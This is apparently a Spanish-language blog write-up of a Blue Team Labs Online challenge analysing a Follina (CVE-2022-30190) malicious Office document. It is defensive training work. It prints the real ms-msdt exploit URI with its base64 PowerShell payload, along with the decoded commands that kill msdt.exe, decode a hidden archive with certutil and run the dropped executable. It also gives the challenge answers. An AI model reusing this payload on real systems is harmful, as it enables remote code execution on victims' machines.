---
title: Follina-Btlo
date: 2024-02-08 14:10:00 +0800
categories: [Btlo, Challenge]
tags: [writing]
render_with_liquid: false
img_path: Ghimg/btlo/challenge/Follina/img
---

## Escenario

Un viernes por la noche, cuando estaba de humor para celebrar su fin de semana, su equipo recibió una alerta con una nueva vulnerabilidad RCE que se estaba explotando activamente en la naturaleza. Se le ha encomendado la tarea de analizar e investigar la muestra para recopilar información para el equipo del fin de semana.

### Used tools
- VirusTotal 
- OSINT

### Resolution summary
- Usamos OSINT para abordar este challenge 
- Para saber mas sobre follina ir a: [Microsoft Office RCE - At  aque MSDT "Follina" (huntress.com)](https://www.huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug)


## Presentación

**_Pregunta 1) ¿Cuál es el valor hash SHA1 de la muestra?_**

para calcular el hash de la muestra usamos ```sha1sum```

![ans1](Pasted_image_20240123161555_wf7jf0)


**_Pregunta 2) Según VirusTotal, ¿cuál es el tipo de archivo completo de la muestra proporcionada?_**

subimos el archivo o introducimos el hash en virustotal

![ans2](Pasted_image_20240123090711_qlonei)


**_Pregunta 3) Extraiga la URL que se utiliza dentro de la muestra y envíela_**

Extraemos el archivo para ver la coleccion de archivos xml

![[Pasted image 20240123162358.png]](Pasted_image_20240123162358_xymc2m)

vemos el archivo `document.xml.rels` que guarda los metadatos de nuestro documento, vemos **TargetMode="External"** con la url 

![[Pasted image 20240123162636.png]](Pasted_image_20240123162636_zsfm6p)


**_Pregunta 4) ¿Cuál es el nombre del archivo XML que almacena la URL extraída?_** 

El archivo que contienelos metadatos **document.xml.rels**


**_Pregunta 5) La URL extraída accede a un archivo HTML que desencadena la vulnerabilidad para ejecutar una carga maliciosa. De acuerdo con las funciones de procesamiento HTML, cualquier archivo con menos del `<Numero>` de bytes no invocaría la carga útil. Envíe el `<Número>`_**

RDF842l.html se ha asociado con una vulnerabilidad de ejecución remota de código en la herramienta de diagnóstico de soporte de Microsoft (MSDT), conocida como “Follina” 

este enlace ya no está disponible en línea, pero [@nao_sec](https://twitter.com/nao_sec/status/1530196847679401984) compartió el contenido original de RDF842l.html. [ANY.RUN](https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/)


```html

window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[Sistema .Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+' JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuIC1Bcmd1bWVudExpc3QgIi9jIHRhc2traWxsIC9mIC9pbSBtc2 R0LmV4ZSI7U3RhcnQtUHJvY2VzcyAkY21kIC13aW5kb3dzdHlsZSBoaWRkZW4gLUFyZ3VtZW50TGlzdCAiL2MgY2QgQzpcdXNlcnNccHVibGljXCYmZm9yIC9yICV0ZW1wJSAlaSBpbiAoMDU tMjAyMi0wNDM4LnJhcikgZG8gY29weSAlaSAxLnJhciAveSYmZmluZHN0ciBUVk5EUmdBQUFBIDEucmFyPjEudCYmY2VydHV0aWwgLWRlY29kZSAxLnQgMS5jICYmZXhwYW5kIDEuYyAtRjoqIC4mJnJnYi5le GUiOw=='+[char]34+'))'))))i/../../../../../../../../../../ ../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";
```

El exploit es un documento HTML que contiene una serie de caracteres A.  Una función de procesamiento HTML tenía un tamaño de búfer codificado y cualquier archivo de menos de 4096 bytes no activaría la carga útil. [Rich Warren](https://twitter.com/buffaloverflow/status/1531168929925713923)


**_Pregunta 6) Después de la ejecución, la muestra intentará eliminar un proceso si ya se está ejecutando. ¿Cómo se llama este proceso?_** 

```
$cmd = "c:\windows\system32\cmd.exe";
Start - Process $cmd  - windowstyle hidden  - ArgumentList "/c taskkill /f /im msdt.exe";
Start - Process $cmd  - windowstyle hidden  - ArgumentList "/c cd C:\users\public\&&for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&&findstr TVNDRgAAAA 1.rar>1.t&&certutil -decode 1.t 1.c &&expand 1.c -F:* .&&rgb.exe";
```

Al decodificar vemos que intenta eliminar el proceso `msdt.exe`



**_Pregunta 7) Se le pidió que escribiera una regla de detección basada en procesos con el identificador de evento de Windows 4688. ¿Cuáles serían ProcessName y ParentProcessname utilizados en esta regla de detección?_**

ID de evento de Windows 4688 se refiere a la creacion de un nuevo proceso.

Las cargas útiles ejecutadas por este vector de ataque crearán un proceso secundario de msdt.exe bajo el padre de Microsoft Office . [microsoft-office-remote-code-execution-follina-msdt-bug](https://www.huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug)


**_Pregunta 8) Envíe el ID de la técnica MITRE utilizada por el ejemplo para la ejecución_**

vemos en mitre que la técnica para la ejecución de comandos 

![Pasted image 20240123182231.png](Pasted_image_20240123182231_vuayoz)


**_Pregunta 9) Enviar el CVE asociado a la vulnerabilidad que se está explotando_**

CVE-2022-30190
